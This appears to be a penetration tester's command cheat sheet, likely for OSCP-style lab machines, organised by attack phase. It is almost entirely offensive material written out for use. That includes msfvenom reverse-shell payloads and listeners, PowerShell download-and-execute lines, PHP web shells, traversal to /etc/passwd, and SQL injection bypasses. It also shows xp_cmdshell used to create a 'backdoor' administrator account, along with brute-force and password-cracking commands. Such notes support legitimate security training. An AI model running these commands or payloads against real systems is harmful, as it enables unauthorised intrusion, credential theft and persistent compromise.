Commands
--------------------------------------------------------------------------------
VPN login
openvpn connectionpack.ovpn
user:<check email>
pass:<check email>

RDP
rdesktop -u user -p password 10.10.10.1 -g 80%

--------------------------------------------------------------------------------
Buffer Overflow

Pattern Create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

Pattern Offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 70423670

Msfvenom payload
msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.1 lport=4444 -b "\x00\x04\x05\x35" -f c

Finding bad characters
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

--------------------------------------------------------------------------------
Netcat/Ncat/NC

Connecting to a port
nc -nv 10.10.10.1 4444

netcat listener
nc -nlvp 4444

--------------------------------------------------------------------------------
Nmap

First Scan(Scanning with safe scripts, standard service detection and output them to a txt file)
nmap -sC -sV -oA nmap_scan 10.10.10.1

TCP all port scan
nmap -p- 10.10.10.1

UDP Scan
nmap -sU 10.10.10.1

Individual NSE script scan (e.g. smb vulnerability scan)
nmap --script=*smb*.nse -p 139,445 10.10.10.1

--------------------------------------------------------------------------------
SMB/NETBIOS Enumeration (Port 135,139,445)

enum4linux
enum4linux 10.10.10.1

smbclient
smbclient -L \\\\10.10.10.1

rpcclient
rpcclient -U "" 10.10.10.1

nbtscan
nbtscan -r 10.10.10.1

nmap nse
nmap -p 139,445 --script=smb-os-discovery 10.10.10.1

--------------------------------------------------------------------------------
SNMP Enumeration (Port 161)

snmp-check 10.10.10.1

--------------------------------------------------------------------------------
Web Server Enumeration (Port 80 , 443) 

Nikto
nikto -h 10.10.10.1

Dirb (URL scans)
dirb http://10.10.10.1/ /usr/share/wordlists/dirb/common.txt
dirb http://10.10.10.1/ /usr/share/seclists/Discovery/Web-Content/common.txt

Wordpress scanner
wpscan --url http://10.10.10.1

Sparta Scanner
sparta 

--------------------------------------------------------------------------------
Tranferring Files

Python SimpleHTTPServer (setup local web server)
python -m SimpleHTTPServer 80
python3 -m http.server

Wget
wget http://10.10.10.1/php-reverse-shell.php -o php-reverse-shell-copied.php

Powershell(Windows)
powershell.exe IEX (New-Object Net.WebClient).DownloadString(http://10.10.10.1/file.php)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.1/fgdump.exe', 'fgdump.exe')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.1/cmd.ps1', 'cmd.ps1')"
powershell -ExecutionPolicy Bypass -File c:\cmd.ps1


--------------------------------------------------------------------------------
Msfvenom payloads (commonly used)

List all available payloads
msfvenom --list payloads

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > reversetcpshell.exe

PHP (remember to edit the php edit after generating)
msfvenom -p php/reverse_php LHOST=10.10.10.1 LPORT=4444 -f raw > phpreverseshell.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw > reverseshell.php
cat reverseshell.php | pbcopy && echo '<?php ' | tr -d '\n' > reverseshell.php && pbpaste >> reverseshell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f asp > aspshell.asp

Python shell
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.1 LPORT=4444 -f raw > pyshell.py


Multihandler Listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.10.1
set lport 4444
set ExitOnSession false
exploit -j

--------------------------------------------------------------------------------
Exploits compilation

i686-w64-mingw32-gcc -o useradd.exe useradd.c
gcc -m32 useradd.c -o useradd.exe
gcc useradd.c -o useradd.exe

--------------------------------------------------------------------------------
LFI/RFI

PHP code execution command injection into vulnerable page
<?php echo system($_GET['cmd']);?>
<?php echo exec($_GET['cmd']);?>
<?php echo shell_exec($_GET['cmd']);?>
<?php echo passthru($_GET['cmd']);?>

Directory Traversal(add/remove "../")
http://10.10.10.1.com?cmd=../../../../../etc/passwd
http://10.10.10.1.com?cmd=../../../../../etc/passwd%00 

URL Encoding
http://www.cheat-sheets.org/sites/html.su/urlencoding.html

Useful references links
https://highon.coffee/blog/lfi-cheat-sheet/
https://awakened1712.github.io/oscp/oscp-lfi-rfi/


--------------------------------------------------------------------------------
SQL injection

Login Pages
' or '1'='1
or 1=1;
" or ""="

MSSQL command execution
EXEC sp_configure 'show advanced options', 1;
GO
Reconfigure;
GO
EXEC sp_configure 'xp_cmdshell', 1;
GO
Reconfigure;
GO

Nmap usage
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="EXEC xp_cmdshell 'dir *.exe';" 10.10.10.1
nmap -vv -sV -Pn -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-poiuytrewq 10.10.10.1
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="ipconfig /all" 10.10.10.1

SQSH db login
sqsh -S 10.10.10.1 -U sa -P poiuytrewq -D database

Using XP_cmdshell to gain administrator privileges by adding user
add user
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="net user backdoor backdoor123 /add" 10.11.1.31
add user to administrator group
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="net localgroup administrators backdoor /add" 10.11.1.31
then proceed to rdp in or login via cmd line.

--------------------------------------------------------------------------------
Password Cracking

Hydra commands
hydra -t 4 -l admin -P ./rockyou.txt -vV 10.10.10.1 ftp
hydra 10.10.10.1 -s 22 ssh -l admin -P ./rockyou.txt

Unshadowing password
sudo unshadow passwd.txt shadow.txt > crackthis.txt
john --wordlist=/usr/share/seclists/rockyou.txt crackthis.txt

Medusa
medusa -h 10.10.10.1 -u admin -P password-file.txt -M http -m DIR:/admin -T 10 
medusa -h 10.10.10.1 -p admin -U user-file.txt -M http -m DIR:/admin -T 10

--------------------------------------------------------------------------------
Privilege Escalation Linux

Things to search for
-Kernel exploits
-Applications and services that are running as root
-Weak file permissions
-cron job
-SUID
-Exploiting users with "." in their PATH

LineEnum.sh --> https://github.com/rebootuser/LinEnum
LinuxPrivChecker.py --> https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py

References
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md


--------------------------------------------------------------------------------
Privilege Escalation Windows

Things to search for
-Unquoted service paths
-Modifying binary service paths
-Unattended installs
-DLL hijacking
-GPP 
-Always install elevated
-UAC bypass


Powersploit --> https://github.com/PowerShellMafia/PowerSploit

References
https://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md


--------------------------------------------------------------------------------
Interactive Shell/Escaping Shell

Spawn TTY shell
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

sTTY options
#In reverse shell
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z

#In Kali
stty raw -echo
fg

#in Reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty row <num> columns <cols>


--------------------------------------------------------------------------------













